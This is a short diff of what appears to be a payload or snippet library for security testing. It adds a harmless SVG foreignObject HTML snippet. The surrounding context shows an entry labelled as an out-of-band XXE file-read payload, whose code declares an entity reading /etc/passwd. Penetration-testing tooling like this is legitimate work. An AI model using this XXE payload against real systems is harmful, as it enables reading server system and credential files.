@@ -82,6 +82,14 @@ self.addEventListener('fetch', (e) => {
     }
   },
   "xml": {
+    "html": {
+      "description": "Embed HTML inside SVG via <foreignObject>, in the HTML namespace",
+      "code": `<foreignObject x="0" y="0" width="100%" height="100%">
+  <html xmlns="http://www.w3.org/1999/xhtml">
+    $0
+  </html>
+</foreignObject>`
+    },
     "!xxe-oob": {
       "description": "Insert an Out-Of-Band XXE file read payload (DTD)",
       "code": `<!ENTITY % file SYSTEM "file://$\{1:/etc/passwd}">
